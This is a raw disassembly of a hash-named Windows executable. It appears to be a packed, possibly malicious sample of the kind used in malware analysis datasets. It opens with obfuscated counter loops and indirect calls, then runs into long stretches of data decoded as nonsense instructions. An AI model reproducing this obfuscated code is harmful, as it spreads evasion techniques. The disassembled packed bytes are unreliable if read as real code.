
c79547f2c0aec9405510845f0de0fbd2e1a5db72e6dcd12ce57f4aa96863d021.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fd0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fd09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e11c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fcf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fcd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fcd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fcd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fcd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fcd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e527
  401090:	cmp    DWORD PTR ds:0x42fcd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fcd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fcd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e124,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e70b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e6fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e6fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e6fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e128
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e2cf
  401100:	cmp    DWORD PTR ds:0x42e6fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e6fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e6fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e6fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e6fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e11c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e11c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e11c,esi
  401145:	cmp    DWORD PTR ds:0x42e11c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e52b
  401160:	cmp    DWORD PTR ds:0x42e11c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e11c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e11c,esi
  40117c:	cmp    DWORD PTR ds:0x42e11c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e134,0x1a
  401193:	cmp    DWORD PTR ds:0x42e134,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e134,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fd7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fd82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e227
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e44b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e134
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e134,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e6fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fd05
  4011f8:	adc    esi,DWORD PTR ds:0x42fd09
  4011fe:	mov    DWORD PTR ds:0x42fd05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e703,0x17
  401216:	cmp    DWORD PTR ds:0x42e703,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e703,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e1c6
  401238:	push   0x42e17d
  40123d:	call   DWORD PTR ds:0x42e52f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e703
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e703,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fd7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fd7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fd7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e227
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e533
  4012a0:	mov    esi,DWORD PTR ds:0x42fd7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fd7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	ffreep st(7)
  4012f5:	inc    ecx
  4012f6:	test   BYTE PTR [eax+0x70],dh
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [edi]
  40130c:	inc    edx
  40130d:	add    cl,BYTE PTR [edi]
  40130f:	xor    ecx,DWORD PTR [edi]
  401311:	ret    0xc71a
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	into   
  4013a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a7:	sbb    eax,0xb8d20161
  4013ac:	inc    ebp
  4013ad:	inc    esp
  4013ae:	adc    DWORD PTR [esi-0x70a0c6b8],edx
  4013b4:	(bad)  
  4013b5:	rol    BYTE PTR [edx+0x71bf4796],0xd2
  4013bc:	mov    ds:0x1ac9aee3,eax
  4013c1:	sbb    DWORD PTR [edi-0x2cae5262],ecx
  4013c7:	mov    esp,0x9db37021
  4013cc:	xchg   ebp,eax
  4013cd:	adc    esi,DWORD PTR [ecx-0x23164fd9]
  4013d3:	push   esi
  4013d4:	das    
  4013d5:	jo     0x40142b
  4013d7:	add    ebx,DWORD PTR [ecx]
  4013d9:	in     eax,0xd4
  4013db:	aad    0xd8
  4013dd:	pop    es
  4013de:	cmp    eax,0xb6083f0a
  4013e3:	rcl    DWORD PTR [edx+0x349d49da],1
  4013e9:	or     dl,ah
  4013eb:	retf   0x5e75
  4013ee:	fst    QWORD PTR [esi]
  4013f0:	pop    ecx
  4013f1:	das    
  4013f2:	ret    0xdabb
  4013f5:	cmp    eax,0xd5ec1cb5
  4013fa:	paddsb mm0,QWORD PTR [esi]
  4013fd:	push   ebx
  4013fe:	or     ebx,DWORD PTR ss:[ebp-0x62b720ff]
  401405:	jnp    0x4013b4
  401407:	lods   eax,DWORD PTR ds:[esi]
  401408:	into   
  401409:	std    
  40140a:	enter  0x8856,0x65
  40140e:	push   ebp
  40140f:	push   0x63
  401411:	aaa    
  401412:	sti    
  401413:	arpl   bp,si
  401415:	out    0x6e,eax
  401417:	mov    ebx,0xfe2feb5c
  40141c:	loopne 0x401408
  40141e:	call   0x8ce:0xc5eb2f60
  401425:	scas   eax,DWORD PTR es:[edi]
  401426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401427:	pop    edi
  401428:	jmp    0x356c:0xec0973e5
  40142f:	enter  0xac,0x9c
  401433:	pop    ds
  401434:	scas   al,BYTE PTR es:[edi]
  401435:	(bad)  
  401437:	jo     0x40142a
  401439:	xor    BYTE PTR [eax+edx*4+0x565b95d6],0x31
  401441:	adc    BYTE PTR ds:0xd2e8389d,bh
  401447:	fidivr DWORD PTR [esi]
  401449:	(bad)  
  40144b:	cmp    eax,0xb5f940e3
  401450:	mov    ?,WORD PTR [esi+0x5a23ec92]
  401456:	int3   
  401457:	mov    bh,0x34
  401459:	int3   
  40145a:	stc    
  40145b:	xor    eax,0xb5fcc5bd
  401460:	push   cs
  401461:	sbb    dh,dh
  401463:	push   edx
  401464:	pop    es
  401465:	das    
  401466:	(bad)  
  401467:	leave  
  401468:	imul   ebx,DWORD PTR [esi-0x1c],0x1bff1985
  40146f:	cs (bad) 
  401471:	into   
  401472:	iret   
  401473:	push   eax
  401474:	sub    eax,edx
  401476:	cmp    bl,0xca
  401479:	sahf   
  40147a:	or     eax,0x38cbe110
  40147f:	xchg   BYTE PTR [eax+0x5e470a0d],cl
  401485:	xlat   BYTE PTR ds:[ebx]
  401486:	je     0x401447
  401488:	sub    BYTE PTR [ecx-0x3b1c804d],cl
  40148e:	sub    ah,BYTE PTR ds:0xd0417b5d
  401494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401495:	push   esi
  401496:	or     BYTE PTR [edi-0xa],al
  401499:	ror    DWORD PTR [edx-0x5a],1
  40149c:	inc    edi
  40149d:	mov    edi,0xf8fbd33b
  4014a2:	fist   WORD PTR [edx+edx*8]
  4014a5:	cmp    bh,BYTE PTR [edi]
  4014a7:	mov    edx,0xeefb2e0a
  4014ac:	int    0x2d
  4014ae:	unpckhps xmm3,XMMWORD PTR [ebx]
  4014b1:	(bad)  
  4014b2:	cmp    DWORD PTR [edi-0x13],ebp
  4014b5:	cld    
  4014b6:	add    DWORD PTR [esp+eiz*2],esi
  4014b9:	mov    edi,0xc0a50848
  4014be:	push   esp
  4014bf:	jl     0x401525
  4014c1:	(bad)  
  4014c2:	mov    ds:0xf4bd35ec,al
  4014c7:	int    0x29
  4014c9:	xor    BYTE PTR ds:0x700b633e,bh
  4014cf:	cmp    al,BYTE PTR [ebx+eiz*2+0x5f]
  4014d3:	pusha  
  4014d4:	xor    DWORD PTR [esi],edx
  4014d6:	fadd   st(5),st
  4014d8:	add    DWORD PTR [edx+0x71],esp
  4014db:	jmp    0x94ce:0xf11b57b
  4014e2:	mov    WORD PTR [ebx],fs
  4014e4:	stos   DWORD PTR es:[edi],eax
  4014e5:	mov    ds:0x3d191374,al
  4014ea:	push   0xffffffea
  4014ec:	repz in al,dx
  4014ee:	loop   0x40154a
  4014f0:	(bad)  
  4014f1:	fucom  st(6)
  4014f3:	push   0xffffffda
  4014f5:	or     esi,DWORD PTR [eax-0xd2b097e]
  4014fb:	je     0x40150f
  4014fd:	pop    ss
  4014fe:	jle    0x401566
  401500:	mov    DWORD PTR [ebp-0x4],eax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x4f1fe013]
  401516:	push   ss
  401517:	mov    ch,0x70
  401519:	jle    0x40158b
  40151b:	jo     0x40158d
  40151d:	jle    0x40158f
  40151f:	jo     0x401528
  401521:	adc    ch,BYTE PTR [ebx+ebx*4+0x71]
  401525:	xor    al,0x55
  401527:	lock xor DWORD PTR [edi-0x30],edx
  40152b:	push   0x2a
  40152d:	repnz cmp BYTE PTR [esi-0x70820543],dl
  401534:	lock jg 0x40158c
  401537:	mov    ds:0x5c68d339,al
  40153c:	in     al,dx
  40153d:	out    dx,eax
  40153e:	jp     0x40151e
  401540:	mov    ah,0x2c
  401542:	int    0xfd
  401544:	mov    edx,0xcee803a3
  401549:	call   0xa671:0x46c23b8c
  401550:	dec    ebx
  401551:	adc    bl,dh
  401553:	loopne 0x40155a
  401555:	xor    al,0x2b
  401557:	out    0xdc,al
  401559:	out    dx,eax
  40155a:	jb     0x4015d2
  40155c:	jb     0x40153b
  40155e:	push   0xe6f84ac7
  401563:	xor    bh,BYTE PTR [edi+0x661afa13]
  401569:	cmp    eax,0x2ec8aef6
  40156e:	out    dx,eax
  40156f:	lea    esi,[ecx+0x45693179]
  401575:	xchg   DWORD PTR [edx+0x62],ebp
  401578:	jns    0x40150f
  40157a:	mov    eax,ds:0x72f2ba0a
  40157f:	or     al,0x54
  401581:	push   cs
  401582:	jmp    0x401529
  401584:	pop    ebp
  401585:	cmp    dh,bh
  401587:	sti    
  401588:	mov    ds:0xd0c4780c,eax
  40158d:	push   esi
  40158e:	test   eax,0xb7fb102d
  401593:	sbb    eax,0xc2891ddc
  401598:	inc    edi
  401599:	jns    0x4015ba
  40159b:	jns    0x401578
  40159d:	(bad)  
  40159e:	ror    BYTE PTR [edx+0x5d],cl
  4015a1:	xor    al,0x95
  4015a3:	xchg   ebp,eax
  4015a4:	scas   eax,DWORD PTR es:[edi]
  4015a5:	iret   
  4015a6:	inc    ebx
  4015a7:	mov    edi,0x4d35e5e8
  4015ac:	js     0x40155f
  4015ae:	push   edi
  4015af:	call   0x1490269a
  4015b4:	fwait
  4015b5:	add    BYTE PTR [ecx],0x1a
  4015b8:	inc    ebx
  4015b9:	mov    esi,DWORD PTR [esi-0x55]
  4015bc:	mov    WORD PTR [eax],?
  4015be:	nop
  4015bf:	mov    dh,0xb3
  4015c1:	fsubr  QWORD PTR [esi+eiz*4-0x7ee70834]
  4015c8:	pop    edx
  4015c9:	outs   dx,BYTE PTR ds:[esi]
  4015ca:	mov    edi,0x70f4c120
  4015cf:	xchg   DWORD PTR [esi],edi
  4015d1:	dec    edi
  4015d2:	or     DWORD PTR [ecx],ebx
  4015d4:	stc    
  4015d5:	cld    
  4015d6:	mov    WORD PTR [ebx],es
  4015d8:	int    0xfc
  4015da:	pop    edi
  4015db:	cmp    dh,BYTE PTR [edx+0x6fb537d1]
  4015e1:	mov    bh,0x78
  4015e4:	fdivr  QWORD PTR [esi+0x27]
  4015e7:	sub    BYTE PTR [edx],bh
  4015e9:	idiv   DWORD PTR [edi-0x77127882]
  4015ef:	test   DWORD PTR [ebx],esp
  4015f1:	sub    al,0xd6
  4015f3:	or     eax,0xe7bc1100
  4015f8:	mov    dl,0xda
  4015fa:	xor    DWORD PTR [eax],eax
  4015fc:	inc    edi
  4015fd:	int    0xc2
  4015ff:	and    al,0x74
  401601:	out    dx,al
  401602:	int3   
  401603:	int    0xab
  401605:	imul   DWORD PTR [ecx]
  401607:	js     0x4015a0
  401609:	aad    0xbe
  40160b:	mov    esi,0xe6a53379
  401610:	sbb    al,0x75
  401612:	fisttp DWORD PTR [edi]
  401614:	cdq    
  401615:	iret   
  401616:	xchg   dh,bl
  401618:	sub    edi,DWORD PTR [edx-0x45]
  40161b:	dec    ebx
  40161c:	sbb    BYTE PTR [edx],0xc1
  40161f:	ret    
  401620:	scas   eax,DWORD PTR es:[edi]
  401621:	add    eax,0xd1dcabec
  401626:	aam    0xe1
  401628:	jae    0x401685
  40162a:	scas   al,BYTE PTR es:[edi]
  40162b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40162c:	mov    edx,0x70626cb4
  401631:	stos   BYTE PTR es:[edi],al
  401632:	cli    
  401633:	cmp    edx,ecx
  401635:	cmp    DWORD PTR [esi-0x75],ecx
  401638:	inc    ebx
  401639:	push   ds
  40163a:	repnz cmp BYTE PTR [edx],cl
  40163d:	addr16 push esp
  40163f:	and    eax,0x32bdda22
  401644:	dec    ecx
  401645:	pop    ebx
  401646:	js     0x401681
  401648:	jp     0x401625
  40164a:	inc    ebx
  40164b:	mov    ds:0xe82179b2,eax
  401650:	push   cs
  401651:	fadd   DWORD PTR ds:0x223b32b4
  401657:	fwait
  401658:	mov    ds:0xcbfbb2a7,eax
  40165d:	mov    eax,ds:0x9ffd6684
  401662:	mov    ecx,0x3a9cf505
  401667:	hlt    
  401668:	mov    al,0xa3
  40166a:	aaa    
  40166b:	out    dx,eax
  40166c:	inc    ebx
  40166d:	jge    0x40163e
  40166f:	pop    ds
  401670:	in     al,0x1f
  401672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401673:	jl     0x401638
  401675:	loope  0x401625
  401677:	xchg   DWORD PTR [esi+0x3c],ecx
  40167a:	pop    edx
  40167b:	adc    bl,BYTE PTR [ecx-0x64]
  40167e:	jo     0x4016ea
  401680:	cmp    al,BYTE PTR [ebp+0x5f00590c]
  401686:	fisttp QWORD PTR [ebx]
  401688:	scas   al,BYTE PTR es:[edi]
  401689:	pusha  
  40168a:	push   0x8dc0a5b2
  40168f:	pop    esi
  401690:	mov    dh,0x1d
  401692:	mov    ecx,0xe74ed37e
  401697:	mov    ds:0x2facdb3b,al
  40169c:	outs   dx,DWORD PTR ds:[esi]
  40169d:	pop    edx
  40169e:	jge    0x401666
  4016a0:	jecxz  0x4016b7
  4016a2:	mov    eax,ds:0x54a49c1e
  4016a7:	xor    DWORD PTR [esi+0x40a976dc],ebx
  4016ad:	(bad)  
  4016ae:	mov    ecx,0xedc6530a
  4016b3:	in     eax,dx
  4016b4:	push   0x69de5115
  4016b9:	mov    ?,WORD PTR [ecx+0x55ae9e8c]
  4016bf:	jbe    0x401701
  4016c1:	and    ebp,DWORD PTR [edi]
  4016c3:	mov    ds:0xe18a27e7,al
  4016c8:	pop    ebx
  4016c9:	aam    0x7
  4016cb:	jne    0x4016de
  4016cd:	into   
  4016ce:	adc    al,0xf0
  4016d0:	or     DWORD PTR [edi+0x46908ce6],edi
  4016d6:	js     0x4016e4
  4016d8:	pop    edx
  4016d9:	xchg   DWORD PTR [edx+ecx*4+0x22dd39de],esi
  4016e0:	mov    al,ds:0xea94d6f7
  4016e5:	jge    0x401752
  4016e7:	pop    edx
  4016e8:	mov    ah,0x2c
  4016ea:	test   DWORD PTR [edx+ebp*4],0x657bb305
  4016f1:	cld    
  4016f2:	cmc    
  4016f3:	push   ebx
  4016f4:	dec    ecx
  4016f5:	mov    WORD PTR [ecx],ds
  4016f7:	(bad)  
  4016f9:	mov    ebx,cs
  4016fb:	arpl   WORD PTR [esi+0x1a],bp
  4016fe:	cld    
  4016ff:	xor    ch,bl
  401701:	inc    ecx
  401702:	lock inc esi
  401704:	xor    esp,0xed2f8a1f
  40170a:	ja     0x401698
  40170c:	push   esi
  40170d:	push   ebx
  40170e:	ins    BYTE PTR es:[edi],dx
  40170f:	ret    0x1fae
  401712:	(bad)
  401716:	(bad)  
  401717:	ss push eax
  401719:	jne    0x4016d9
  40171b:	mov    esi,0xdb9e9735
  401720:	lea    eax,[ebp-0x30]
  401723:	mov    DWORD PTR [ebp-0x34],eax
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	test   al,0x71
  401742:	xchg   dh,dh
  401744:	jo     0x4017c2
  401746:	jo     0x4017b8
  401748:	jo     0x4017c8
  40174a:	jo     0x4017bc
  40174c:	add    al,BYTE PTR [edi]
  40174e:	mov    ah,0xc
  401750:	(bad)  
  401751:	imul   edx,DWORD PTR [edi+0x18],0xffffffc7
  401755:	adc    DWORD PTR [esi+0x46d2c188],edi
  40175b:	inc    ecx
  40175c:	data16 aaa 
  40175e:	(bad)  
  40175f:	adc    esi,DWORD PTR [edi+0x378042e]
  401765:	or     ecx,eax
  401767:	pop    ss
  401768:	mov    eax,0x3b82b53
  40176d:	(bad)  
  40176e:	or     eax,0x96dcaee7
  401773:	sub    dh,al
  401775:	in     al,dx
  401776:	loopne 0x40172e
  401778:	in     al,dx
  401779:	xor    al,0xb9
  40177b:	xchg   BYTE PTR [esp+ebp*1+0x4f],dl
  40177f:	call   0xb1dd4f5a
  401784:	lods   al,BYTE PTR ds:[esi]
  401785:	jg     0x40170f
  401787:	sub    edi,DWORD PTR [esp+ebp*2]
  40178a:	cmp    esp,esi
  40178c:	iret   
  40178d:	das    
  40178e:	add    BYTE PTR [esi-0x49],dh
  401791:	lods   al,BYTE PTR ds:[esi]
  401792:	jae    0x40172e
  401794:	in     al,0x91
  401796:	xor    BYTE PTR fs:[ebx-0x6b54f264],ch
  40179d:	ja     0x40176e
  40179f:	mov    edx,0xb74c70ab
  4017a4:	ds aam 0xdc
  4017a7:	cmp    al,0xc2
  4017a9:	xchg   ebp,eax
  4017aa:	jecxz  0x401810
  4017ac:	sti    
  4017ad:	loope  0x401766
  4017af:	adc    ebp,DWORD PTR [ebx]
  4017b1:	mov    ebp,0x2535f6c9
  4017b6:	(bad)  
  4017b7:	int3   
  4017b8:	enter  0xfe6c,0xa7
  4017bc:	dec    ecx
  4017bd:	mov    eax,0x142fd91f
  4017c2:	push   esp
  4017c3:	(bad)  
  4017c5:	xor    ch,0xd3
  4017c8:	repnz mov bh,0xe5
  4017cb:	stos   BYTE PTR es:[edi],al
  4017cc:	mov    DWORD PTR [ebp+0x80d0988],esi
  4017d2:	adc    DWORD PTR [ebx+0x42],ecx
  4017d5:	cmp    eax,0x28a2d4c5
  4017da:	ficomp WORD PTR [di-0x15]
  4017de:	pop    edx
  4017df:	dec    ebp
  4017e0:	scas   al,BYTE PTR es:[edi]
  4017e1:	pop    ds
  4017e2:	ret    
  4017e3:	in     al,dx
  4017e4:	or     dh,BYTE PTR [esi+0x15f2e28e]
  4017ea:	push   ebp
  4017eb:	or     ch,BYTE PTR [ebx-0x67eac98d]
  4017f1:	xchg   DWORD PTR [ebp+esi*8+0x7b66ef9d],edi
  4017f8:	jne    0x401831
  4017fa:	pop    edx
  4017fb:	push   0xdb6ee6dd
  401800:	mov    BYTE PTR [edx],dh
  401802:	push   cs
  401803:	sbb    al,dl
  401805:	inc    ebx
  401806:	jl     0x4017d7
  401808:	pop    ds
  401809:	sbb    eax,0x8007695a
  40180e:	or     eax,0xa2a466b8
  401813:	sub    edi,DWORD PTR [edi]
  401815:	aas    
  401816:	fld    TBYTE PTR [esi]
  401818:	xchg   edx,eax
  401819:	mov    es,ebx
  40181b:	mov    esp,0x790b3e20
  401820:	imul   eax,DWORD PTR [edi],0xda50e9e9
  401826:	ins    BYTE PTR es:[edi],dx
  401827:	inc    edi
  401828:	adc    esp,DWORD PTR [ebx]
  40182a:	xchg   ebx,eax
  40182b:	repz xor ch,bl
  40182e:	mov    bh,0xd2
  401830:	shl    DWORD PTR [ebx],0x37
  401833:	(bad)  
  401834:	and    BYTE PTR [ebp+ebp*4-0x18],bl
  401838:	mov    ebx,DWORD PTR [eax+0x75]
  40183b:	sbb    ah,BYTE PTR [esi]
  40183d:	nop
  40183e:	aam    0x64
  401840:	scas   al,BYTE PTR es:[edi]
  401841:	xbegin 0x6944fb87
  401847:	sbb    ebp,ebx
  401849:	sahf   
  40184a:	dec    ecx
  40184b:	or     ah,dh
  40184d:	cmp    ch,BYTE PTR [esi-0x6c75f22b]
  401853:	and    esi,DWORD PTR [ecx+0x46f3ee94]
  401859:	xchg   esp,eax
  40185a:	dec    ecx
  40185b:	ror    BYTE PTR [ebp+edx*1+0x6e],0x3e
  401860:	cmc    
  401861:	inc    ecx
  401862:	jnp    0x401823
  401864:	ja     0x40188c
  401866:	sti    
  401867:	mov    ebx,DWORD PTR [ebx-0x3446fbcc]
  40186d:	sbb    DWORD PTR [eax+0x66e1210d],ecx
  401873:	dec    ebp
  401874:	pusha  
  401875:	mov    esp,0x8b4d9d66
  40187a:	adc    DWORD PTR [ebp-0x4a],0xffffffc6
  40187e:	dec    ebp
  40187f:	xchg   ecx,eax
  401880:	scas   eax,DWORD PTR es:[edi]
  401881:	fcomp  QWORD PTR [ebx]
  401883:	or     eax,0x9395812
  401888:	jge    0x401903
  40188a:	add    esp,DWORD PTR [ebp-0x12]
  40188d:	cmc    
  40188e:	cmp    BYTE PTR [esi-0x77e937b6],cl
  401894:	ins    BYTE PTR es:[edi],dx
  401895:	and    eax,DWORD PTR [esi]
  401897:	xchg   ecx,eax
  401898:	fld    DWORD PTR [esi+0x4551097b]
  40189e:	(bad)
  4018a2:	lods   al,BYTE PTR ds:[esi]
  4018a3:	in     al,0x31
  4018a5:	mov    ah,0xf3
  4018a7:	inc    esi
  4018a8:	loopne 0x4018c7
  4018aa:	leave  
  4018ab:	mov    al,0xad
  4018ad:	loopne 0x40183d
  4018af:	fimul  DWORD PTR [edx+0xe8bcbb2]
  4018b5:	pop    es
  4018b6:	mov    bl,0xf9
  4018b8:	les    edx,FWORD PTR [eax]
  4018ba:	adc    eax,0xcd312875
  4018bf:	mov    WORD PTR [ecx+0xf66b2fe],?
  4018c5:	sbb    BYTE PTR [ebx-0x2a],dl
  4018c8:	pusha  
  4018c9:	mov    esi,0x62303115
  4018ce:	and    edx,ebp
  4018d0:	mov    bl,0x5
  4018d2:	xor    BYTE PTR [edx+eiz*4+0x2561c4c9],al
  4018d9:	mov    edi,0x2e8fb058
  4018de:	jp     0x4018e7
  4018e0:	add    BYTE PTR [edx+0x1a],ah
  4018e3:	jae    0x401900
  4018e5:	add    al,bl
  4018e7:	arpl   WORD PTR [ecx-0x8],ax
  4018ea:	jecxz  0x4018e4
  4018ec:	enter  0x13c5,0x7
  4018f0:	test   DWORD PTR [edi+eax*4-0x224f4452],edx
  4018f7:	int    0x75
  4018f9:	mov    dh,0x5b
  4018fb:	ds sbb al,0xda
  4018fe:	pop    ebp
  4018ff:	or     eax,0xd4fb7277
  401904:	dec    ebp
  401905:	push   0x85ddf2d3
  40190a:	adc    bh,BYTE PTR [eax+eax*4-0x2b]
  40190e:	das    
  40190f:	jle    0x401901
  401911:	sub    DWORD PTR [ebp+0x4b],0xe14461d1
  401918:	cmp    al,bl
  40191a:	pop    ecx
  40191b:	and    cl,BYTE PTR [edi+0x206ed83a]
  401921:	jp     0x4018eb
  401923:	cmp    bh,cl
  401925:	popa   
  401926:	or     ebx,DWORD PTR [esi-0x34]
  401929:	mov    edx,0xbeaab93b
  40192e:	mov    al,0x6
  401930:	retf   0x764c
